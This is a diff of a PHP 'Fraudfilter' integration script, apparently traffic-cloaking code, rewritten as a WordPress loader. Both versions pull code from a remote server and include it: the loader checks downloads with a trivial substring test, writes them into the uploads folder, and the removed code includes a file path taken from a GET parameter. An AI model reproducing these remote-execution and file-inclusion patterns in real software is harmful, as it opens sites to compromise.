@@ -1,324 +1,193 @@
 <?php
+
 /**
- * Fraudfilter PHP Upload Code
+ * Fraudfilter PHP Paste & WordPress Integration Code
  *
- * Last Update: 2024-08-28 04:06:49 UTC
+ * Last Update: 2024-08-28 03:09:30 UTC
  * Version: 1.0.1
  * Author: Alex Shelznyev
  *
  * Minimum Supported Version: PHP 7.4
  * Preferred Versions: PHP 8.0, 8.1, 8.2, 8.3
  * 
+ * ADVANCED
+ * Verification code for WordPress Plugin: Yfs^3X4AgVEzT&
  */
-
 error_reporting(0);
 
-class FraudFilterDetector_1adt2 {
+class FraudFilterWordPressLoader_1adt2 {
+    private $clid;
+    private $campaignSecret;
+    private $host;
+    private $integrationType;
 
-    public function check() {
+    public function __construct() {
+        $this->clid = '1adt2';
+        $this->campaignSecret = '81342400-3ddf-4835-a3de-57db44f14daa';
+        $this->host = 'api.fraudfilter.io';
+        $this->integrationType = 'EMBED';
+    }
 
-        ob_start();
+    public function run() {
+        $fileName = $this->getFileName();
 
-        if (isset($_GET['ff17x_sign'], $_GET['ff17x_time']) && $this->isSignatureValid($_GET['ff17x_sign'], $_GET['ff17x_time'])) {
-            error_reporting(E_ALL);
-            $this->runInMaintenanceMode();
-            exit();
+        $GLOBALS['fbIncludedFileName'] = $fileName;
+        $GLOBALS['fbIncludedHomeDir'] = dirname($fileName);
+
+        if (isset($_GET['ff17x_sign'], $_GET['ff17x_time'], $_GET['ff17x_mode'])) {
+            $this->handleRequest($fileName);
         }
 
-        $resultObj = $this->sendRequestAndGetResult2(false);
-
-        if ($resultObj->result || !0) {
-            $this->action($resultObj);
-        }
-    }
-
-    function url_origin($s)
-    {
-        $ssl      = ( ! empty( $s['HTTPS'] ) && $s['HTTPS'] == 'on' );
-        $sp       = strtolower( $s['SERVER_PROTOCOL'] );
-        $protocol = substr( $sp, 0, strpos( $sp, '/' ) ) . ( ( $ssl ) ? 's' : '' );
-        $port     = $s['SERVER_PORT'];
-        $port     = ( ( ! $ssl && $port=='80' ) || ( $ssl && $port=='443' ) ) ? '' : ':'.$port;
-        $host     = $s['HTTP_HOST'];
-        $host     = isset( $host ) ? $host : $s['SERVER_NAME'] . $port;
-        return $protocol . '://' . $host;
-    }
-
-    function full_url($s)
-    {
-        return $this->url_origin($s) . $s['REQUEST_URI'];
-    }
-
-    function isSignatureValid($sign, $time) {
-        return hash_equals(sha1('81342400-3ddf-4835-a3de-57db44f14daa.' . $this->getClid() . '.' . $time), $sign);
-    }
-
-    function runInMaintenanceMode() {
-        $mode = $_GET['ff17x_mode'] ?? null;
-        if ($mode === null) {
-            return $this->returnError('Maintenance mode not set');
-        }
-
-        global $fbIncludedFileName, $fbIncludedHomeDir;
-
-        $fileName = $fbIncludedFileName ?: __FILE__;
-        $home = $fbIncludedHomeDir ?: dirname(__FILE__);
-
-        switch ($mode) {
-            case 'upgrade':
-                return $this->upgradeScript($home, $fileName);
-            case 'diagnostics':
-                return $this->performDiagnostics($home, $fileName);
-            default:
-                return $this->returnError('Undefined maintenance mode: ' . $mode);
+        if (file_exists($fileName)) {
+            include($fileName);
         }
     }
 
-    function redirect($url) {
-        $url = filter_var($url, FILTER_SANITIZE_URL);
-        if (!filter_var($url, FILTER_VALIDATE_URL)) {
-            throw new InvalidArgumentException('Invalid URL provided');
+    private function getFileName() {
+        static $fileName = null;
+        if ($fileName === null) {
+            $wpmode = function_exists('wp_upload_dir');
+            $home = $wpmode ? wp_upload_dir()['basedir'] : __DIR__;
+            $fileName = $home . DIRECTORY_SEPARATOR . $this->clid . '.include.php';
         }
-
-        if (!function_exists('headers_sent') || !headers_sent()) {
-            header('Location: ' . $url, true, 302);
-            die();
-        }
-
-        $escapedUrl = htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
-?>
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Redirecting...</title>
-        <meta name="robots" content="noindex,nofollow">
-        <script type="text/javascript">
-            window.location.replace('<?= $escapedUrl ?>');
-        </script>
-        <noscript>
-            <meta http-equiv="refresh" content="0;url='<?= $escapedUrl ?>'">
-        </noscript>
-    </head>
-    <body>
-        You are being redirected to <a href="<?= $escapedUrl ?>" target="_top">your destination</a>.
-        <script type="text/javascript">
-            window.location.replace('<?= $escapedUrl ?>');
-        </script>
-    </body>
-    </html>
-<?php
-        die();
+        return $fileName;
     }
 
-
-    function returnError($message) {
-         echo('{"success":false, "errorMessage":"'.$message.'"}');
-    }
-
-    function returnErrorByCode($code, $args) {
-        echo json_encode([
-            'success' => false,
-            'extErrors' => [['code' => $code, 'args' => $args]],
-            'version' => 4
-        ]);
-    }
-
-    function getClid() {
-        return '1adt2';
-    }
-
-    function appendGetParameters($url, $getParameters) {
-        if (!$getParameters) {
-            return $url;
-        }
-        $separator = strpos($url, '?') !== false ? '&' : '?';
-        return $url . $separator . $getParameters;
-    }
-    function action($result) {
-        if (!isset($result->type)) {
-            $this->safeAction();
-            return;
-        }
-        
-        switch ($result->type) {
-            case 'u':
-                $this->redirect($result->url);
-                break;
-            case 'f':
-                include($result->url);
+    private function handleRequest($fileName) {
+        if (!file_exists($fileName) || in_array($_GET['ff17x_mode'], ['diagnostics', 'upgrade'], true)) {
+            if ($this->isSignatureValidTemp($_GET['ff17x_sign'], $_GET['ff17x_time'])) {
+                try {
+                    error_reporting(E_ALL);
+                    $diagnosticsResult = $this->performDiagnosticsWP($fileName);
+                    if (!$diagnosticsResult['success']) {
+                        echo json_encode($diagnosticsResult);
+                    } elseif ($_GET['ff17x_mode'] !== 'diagnostics' || !file_exists($fileName)) {
+                        $this->downloadScriptFirstTime($fileName);
+                    } else {
+                        echo json_encode($diagnosticsResult);
+                    }
+                } catch (Exception $e) {
+                    echo json_encode(['success' => false, 'errors' => [$e->getMessage()], 'version' => 4]);
+                }
                 exit;
-            default:
-                $this->safeAction();
+            }
         }
     }
-    function safeAction() {
-        $this->redirect('https://www.allrecipes.com');
+
+    private function isSignatureValidTemp($sign, $time) {
+        return hash_equals(sha1($this->campaignSecret . '.' . $this->clid . '.' . $time), $sign);
     }
 
-function performDiagnostics($home, $fileName) {
-    header("X-FF: true");
-    $errors = [];
-    $extErrors = [];
-
-    if (isset($_GET['ff17x_checkfile'])) {
-        $filename = $_GET['ff17x_checkfile'];
-        $result = $this->checkFile($filename);
-        echo json_encode($result);
-        return;
-    }
-
-    $success = true;
-    $permissionsIssues = $this->hasPermissionsIssues($home, $fileName);
-    if ($permissionsIssues) {
-        $extErrors[] = $permissionsIssues;
-        $success = false;
-    }
-
-    // Measure curl connection issues
-    $curlConnectionIssues = $this->measureConnectionIssues($this->getCurlConnectionIssues());
-
-    // Measure contents connection issues
-    $contentsConnectionIssues = $this->measureConnectionIssues($this->getContentsConnectionIssues());
-
-    $result = [
-        'success' => $success,
-        'version' => 6,
-        'diagnostics' => true,
-        'errors' => $errors,
-        'extErrors' => $extErrors,
-        'phpversion' => phpversion(),
-        'connection' => $curlConnectionIssues,
-        'contentsConnection' => $contentsConnectionIssues
-    ];
-    echo json_encode($result);
-}
-
-private function measureConnectionIssues($issues) {
-    $time_start = microtime(true);
-    $issues->duration = microtime(true) - $time_start;
-    return $issues;
-}
-
-function getCurlConnectionIssues() {
-    return $this->sendRequestAndGetResultCurl2(true);
-}
-
-function getContentsConnectionIssues() {
-    return $this->sendRequestAndGetResultFileGetContents2(true);
-}
-
-function checkFile($filename) {
-    $extErrors = array();
-    if (!file_exists($filename)) {
-        $extErrors[] = array('code' => 'FILE_NOT_FOUND','args' => array($filename));
-        return array('success' => false, 'diagnostics' => true, 'extErrors' => $extErrors, 'version' => 6);
-    }
-    include ($filename);
-    return "--- end of file inclusion ---";
-}
-
-
-function getUpgradeScriptViaContents($home, $fileName) {
-    $opts = [
-        'http' => [
-            'method'  => 'GET',
-            'header'  => 'x-ff-secret: 81342400-3ddf-4835-a3de-57db44f14daa',
-            'timeout' => 2
-        ]
-    ];
-
-    $context = stream_context_create($opts);
-    return @file_get_contents($this->getFileNameForUpdates("contents"), false, $context);
-}
-
-function getFileNameForUpdates($type) {
-    return "https://api.fraudfilter.io/v1/integration/get-updates?clid=".$this->getClid().'&integrationType=DEFAULT&type='.$type;
-}
-
-function upgradeScript($home, $fileName) {
-    $output = $this->getUpgradeScriptViaContents($home, $fileName);
-    if ($output === false || !$this->isSignature2Valid($output)) {
-        $ch = curl_init($this->getFileNameForUpdates("curl"));
-
-        curl_setopt_array($ch, [
-            CURLOPT_DNS_CACHE_TIMEOUT => 120,
-            CURLOPT_CONNECTTIMEOUT    => 5,
-            CURLOPT_TIMEOUT           => 10,
-            CURLOPT_HTTPHEADER        => ['x-ff-secret: 81342400-3ddf-4835-a3de-57db44f14daa'],
-            CURLOPT_RETURNTRANSFER    => 1
+    private function getUpgradeScriptViaContentsWP() {
+        $context = stream_context_create([
+            'http' => [
+                'method' => 'GET',
+                'header' => 'x-ff-secret: ' . $this->campaignSecret,
+                'timeout' => 2
+            ]
         ]);
+        return @file_get_contents($this->getFileNameForUpdatesWP("contents"), false, $context);
+    }
 
-        $output = curl_exec($ch);
-        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    private function getFileNameForUpdatesWP($type) {
+        return "https://{$this->host}/v1/integration/get-updates?clid={$this->clid}&integrationType={$this->integrationType}&type=$type";
+    }
 
-        if (!$output) {
-            curl_close($ch);
-            return $this->returnError('Server returned empty answer. HTTP error: ' . $http_status);
+    private function isSignature2ValidTemp($content) {
+        return strpos($content, '@FraudFilter.io 20') !== false;
+    }
+
+    private function downloadScriptFirstTime($fileName) {
+        $output = $this->getUpgradeScriptViaContentsWP();
+
+        if ($output === false || !$this->isSignature2ValidTemp($output)) {
+            $output = $this->fetchViaCurl();
         }
 
-        $curl_error_number = curl_errno($ch);
+        if ($this->writeFile($fileName, $output)) {
+            echo json_encode(['success' => true, 'phpversion' => PHP_VERSION, 'version' => 5]);
+        } else {
+            echo json_encode(['success' => false, 'version' => 5, 'errorMessage' => "Unable to write to file: $fileName. Please check permissions for folder: " . dirname($fileName)]);
+        }
+    }
+
+    private function fetchViaCurl() {
+        if (!function_exists('curl_init')) {
+            throw new Exception('cURL is not available on this server.');
+        }
+
+        $ch = curl_init($this->getFileNameForUpdatesWP("curl"));
+        curl_setopt_array($ch, [
+            CURLOPT_HTTPHEADER => ['x-ff-secret: ' . $this->campaignSecret],
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_CONNECTTIMEOUT => 5,
+            CURLOPT_TIMEOUT => 10,
+        ]);
+        $output = curl_exec($ch);
+        $error = curl_error($ch);
         curl_close($ch);
 
-        if ($curl_error_number) {
-            return $this->returnErrorByCode("CURL_ERROR_" . $curl_error_number, null);
+        if ($error) {
+            throw new Exception("cURL Error: $error");
+        }
+
+        if (!$this->isSignature2ValidTemp($output)) {
+            throw new Exception("Malformed answer received from the server.");
+        }
+        return $output;
+    }
+
+    private function writeFile($fileName, $content) {
+        return file_put_contents($fileName, $content, LOCK_EX) !== false;
+    }
+
+    function hasPermissionsIssuesWP($home, $fileName) {
+        ob_start();
+        $tempFileName = $fileName.'.tempfile';
+        $tempFile = fopen($tempFileName, 'w');
+        if ( !$tempFile ) {
+            ob_end_clean();
+            return array('code' => 'WRITE_PERMISSION','args' => array($tempFileName, $home));
+        } else {
+            ob_end_clean();
+            $meta_data = stream_get_meta_data($tempFile);
+            $fullfilename = $meta_data["uri"];
+            fclose($tempFile);
+            return unlink($tempFileName) ? "" : array('code' => 'UNABLE_TO_DELETE_TEMP_FILE','args' => array($tempFileName, $home));
         }
     }
 
-    if (!$this->isSignature2Valid($output)) {
-        return $this->returnErrorByCode("WRONG_SIGNATURE", null);
-    }
+    function performDiagnosticsWP($fileName) {
+        header("X-FF: true");
+        $errors = array();
+        $extErrors = array();
+        $success = true;
+        $home = dirname($fileName);
 
-    $tempFileName = $fileName.'.downloaded';
-    if (file_put_contents($tempFileName, $output) === false) {
-        return $this->returnErrorByCode("WRITE_PERMISSION", [$tempFileName, $home]);
-    }
-
-    if (!rename($tempFileName, $fileName)) {
-        return $this->returnErrorByCode("WRITE_PERMISSION", [$tempFileName, $home]);
-    }
-
-    echo json_encode(['success' => true, 'errorMessage' => '']);
-}
-
-function isSignature2Valid($content) {
-    return strpos($content, '@FraudFilter.io 20') !== false;
-}
-
-function checkSignature($content) {
-    return array('code' => 'WRONG_SIGNATURE');
-}
-
-function hasPermissionsIssues($home, $fileName) {
-    $tempFileName = $fileName.'.tempfile';
-    if (!@touch($tempFileName)) {
-        return ['code' => 'WRITE_PERMISSION', 'args' => [$tempFileName, $home]];
-    }
-    
-    return @unlink($tempFileName) ? "" : ['code' => 'UNABLE_TO_DELETE_TEMP_FILE', 'args' => [$tempFileName, $home]];
-}
-    function concatQueryVars($originalUrl) {
-        $secondUri = $_SERVER['REQUEST_URI'];
-        $url = strstr($originalUrl, '?', true) ?: $originalUrl;
-        $firstQuery = parse_url($originalUrl, PHP_URL_QUERY);
-        $secondQuery = parse_url($secondUri, PHP_URL_QUERY);
-        
-        if (!$secondQuery) {
-            return $originalUrl;
+        $permissionsIssues = $this->hasPermissionsIssuesWP($home, $fileName);
+        if ($permissionsIssues) {
+            $extErrors[] = $permissionsIssues;
+            $success = false;
         }
-        
-        if (!$firstQuery) {
-            return $url . '?' . $secondQuery;
-        }
-        
-        return $url . '?' . $firstQuery . '&' . $secondQuery;
-    }
-    function sendRequestAndGetResult2($diagnostics) {
-        return $this->sendRequestAndGetResultCurl2($diagnostics);
+        $serverConnectionIssues = $this->getCurlConnectionIssuesWP();
+        $contentsConnectionIssues = $this->getContentsConnectionIssuesWP();
+        $result = array('success' => $success, 'diagnostics' => true, 'extErrors' => $extErrors, 'errors' => $errors, 'version' => 5, 'phpversion' => PHP_VERSION, 'connection' => $serverConnectionIssues, 'contentsConnection' => $contentsConnectionIssues);
+        return $result;
     }
 
-    function sendRequestAndGetResultCurl2($diagnostics) {
+    function getCurlConnectionIssuesWP() {
+        return $this->sendRequestAndGetResultCurlWP2(true);
+    }
+
+    function getContentsConnectionIssuesWP() {
+        return $this->sendRequestAndGetResultFileGetContentsWP2(true);
+    }
+
+        function sendRequestAndGetResultWP2($diagnostics) {
+        return $this->sendRequestAndGetResultCurlWP2($diagnostics);
+    }
+
+    function sendRequestAndGetResultCurlWP2($diagnostics) {
         $resultObj = new stdClass();
         $resultObj->result = false;
 
@@ -368,7 +237,7 @@ function hasPermissionsIssues($home, $fileName) {
         return $resultObj;
     }
 
-    function sendRequestAndGetResultFileGetContents2($diagnostics) {
+    function sendRequestAndGetResultFileGetContentsWP2($diagnostics) {
         $time_start = microtime(true);
         $resultObj = new stdClass();
         $resultObj->result = false;
@@ -532,12 +401,11 @@ function hasPermissionsIssues($home, $fileName) {
         $output = curl_exec($ch);
     }
 
-
 }
 
-$fraudFilterDetector_1adt2 = new FraudFilterDetector_1adt2();
-$fraudFilterDetector_1adt2->check();
+$fraudFilterWordPressLoader_1adt2 = new FraudFilterWordPressLoader_1adt2();
+$fraudFilterWordPressLoader_1adt2->run();
 
-// @FraudFilter.io 2024-08-28 04:06:49 UTC
+// @FraudFilter.io 2024-08-28 03:09:35 UTC
 ?>
 
